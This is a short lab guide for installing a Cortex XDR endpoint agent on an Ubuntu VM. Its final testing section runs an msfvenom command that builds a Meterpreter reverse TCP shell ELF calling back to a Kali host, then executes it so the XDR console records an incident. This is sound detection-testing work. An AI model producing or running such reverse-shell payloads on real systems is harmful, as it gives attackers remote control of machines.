# XDR on Linux
## Prerequisites
- A working target VM of any Linux distro (target)- I chose Ubuntu
- A windows host (source) containing the Linux XDR package
- (Optional) A Kali Linux machine for generating payloads

### 1. Start the Server (Source Machine)
On your Windows machine, open PowerShell and navigate to the folder containing your agent files. To transfer the installation files without setting up complex shares, use Python’s built-in HTTP server capability.

```powershell
# Start the temporary web server
python -m http.server 8000
```

_Leave this terminal window open. Closing it will kill the server._

### 2. Download the file (destination machine)
On your VM terminal, use `wget` to pull the file.
```bash
# Syntax: wget http://<WINDOWS_IP>:8000/filename
wget http://10.1.1.x:8000/xUbuntu_VM_deb.tar.gz
```

### 3. Configure and Install
- **On Windows:** Press `Ctrl + C` in the PowerShell window to stop the server.
- **On Linux:** Extract your file to begin the installation:
    ```bash
    tar -xvf xUbuntu_VM_deb.tar.gz
    ```
- `cat readme.md` and follow the instructions:
	- `sudo mkdir -p /etc/panw`
	- `sudo cp cortex.conf /etc/panw/`
- Install the Debian package: `sudo apt-get install ./cortex-9.2.0.119.deb`

### 4. Verify Install
- Check XDR console, and you should see the endpoint in inventory
- On the Linux cli, run `dpkg -l | grep cortex-agent`. You should see `ii cortex-agent <version>` which will verify install ("in inventory")
### 5. Testing
For a simulation attack, on your Kali machine, use `msfvenom` to compile a 64-bit Linux Meterpreter reverse TCP shell executable:
- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your_Kali_IP> LPORT=443 -f elf -o shell1.elf
- Navigate to the socket in the linux web browser: `http://<IP>:<port>`
- Download the shell1.elf file
- On the Linux cli, grant execution permissions to the payload `chmod +x shell1.elf`
- Execute the file `./shell1.elf`
- Return to the XDR console to review the incident

[Video](https://drive.google.com/file/d/15xDgiSt464ap-uEbRx3At3mHI0x_aPOT/view?usp=sharing)
